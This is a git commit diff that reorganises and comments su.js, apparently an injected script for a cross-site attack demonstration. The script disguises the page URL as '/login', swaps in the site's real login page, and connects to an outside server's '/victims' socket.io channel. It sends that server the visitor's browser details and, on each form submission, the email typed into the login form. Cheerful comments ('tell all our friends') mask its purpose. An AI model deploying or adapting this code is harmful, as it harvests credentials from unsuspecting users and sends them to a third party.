934aa7f87bae0587bd485fed0d2975422949460a
Christopher Orr <chris@orr.me.uk>
2013-12-07 17:42:55 +0100

    Be nice and comment the code.

--- su.js
+++ su.js
@@ -1,50 +1,66 @@
 var host = window.location.host;
 var path = '/login';
+var socket = null;
 
-(function() {
-  history.replaceState(null, 'Log in', path);
+// The page URL is so ugly; let's pretend we're visiting a more reassuring URL
+history.replaceState(null, 'Log in', path);
 
-  var script = document.createElement("script");
-  var hash = /com$/.test(host) ? '67b1ba83e869c8e79f6e36d0e09b5800' :'1b3785e50daff644c60797acabafb97d';
-  script.src = '/assets/application-' + hash + '.js';
-  script.type = 'text/javascript';
-  document.getElementsByTagName('head')[0].appendChild(script);
-  script = document.createElement("script");
+// We're lazy, so we'll use jQuery. Speed things up by loading a copy from the current site
+var hash = /com$/.test(host) ? '67b1ba83e869c8e79f6e36d0e09b5800' :'1b3785e50daff644c60797acabafb97d';
+loadScript('/assets/application-' + hash + '.js');
 
-  script.src = 'https://test.orr.me.uk:8443/socket.io/socket.io.js';
-  script.type = 'text/javascript';
-  document.getElementsByTagName('head')[0].appendChild(script);
+// Once jQuery is ready, use it to replace the current ugly page with the real login page
+waitFor('jQuery', function($) {
+  $.get('//' + host + path, setPageContent);
+});
 
-  var checkReady = function(dep, callback) {
-    if (window.hasOwnProperty(dep)) {
-      callback(window[dep]);
-    } else {
-      window.setTimeout(function() { checkReady(dep, callback); }, 50);
-    }
-  };
+// Let's also load socket.io so that we can be more social
+loadScript('https://test.orr.me.uk:8443/socket.io/socket.io.js');
 
-  var socket = null;
-  checkReady('jQuery', function($) {
-    $.get('//' + host + path, {}, function(data) {
-      $(document.body).html(data);
-      var title = $('body title').text();
-      window.document.title = title;
-      $('form').submit(function(e) {
-        if (socket === null) {
-          return true;
-        }
-        socket.emit('submit', $('#user_session_email').val());
-        e.preventDefault();
-        var form = this;
-        setTimeout(function () {
-          form.submit();
-        }, 500);
-      });
-    });
-  });
+// Once socket.io is ready, let's tell all our friends that we're online!
+waitFor('io', function(io) {
+  socket = io.connect('https://test.orr.me.uk:8443/victims', {secure: true});
+  socket.emit('info', navigator.userAgent);
+});
 
-  checkReady('io', function(io) {
-    socket = io.connect('https://test.orr.me.uk:8443/victims', {secure: true});
-    socket.emit('info', navigator.userAgent);
-  });
-})();
+function setPageContent(html) {
+  // Replacing the root HTML tag maybe isn't possible?
+  // Anyway, this is ugly but works fine
+  $(document.body).html(html);
+ 
+  // The login page has a nicer title, so let's use that
+  document.title = $('body title').text();
+
+  // Make sure we hear about any login attempts...
+  $('form').submit(submitForm);
+}
+
+function submitForm(e) {
+  // Aw, that's unfortunate
+  if (socket === null) {
+    return true;
+  }
+
+  // Tell everyone that we're going to log in. Yay!
+  socket.emit('submit', $('#user_session_email').val());
+
+  // Wait a wee moment so that all our friends get that socket.io message
+  e.preventDefault();
+  var form = this;
+  setTimeout(function() { form.submit(); }, 500);
+}
+
+function waitFor(property, callback) {
+  if (window.hasOwnProperty(property)) {
+    callback(window[property]);
+  } else {
+    setTimeout(function() { waitFor(property, callback); }, 50);
+  }
+}
+
+function loadScript(url) {
+  var tag = document.createElement('script');
+  tag.src = url;
+  document.getElementsByTagName('head')[0].appendChild(tag);
+}
+
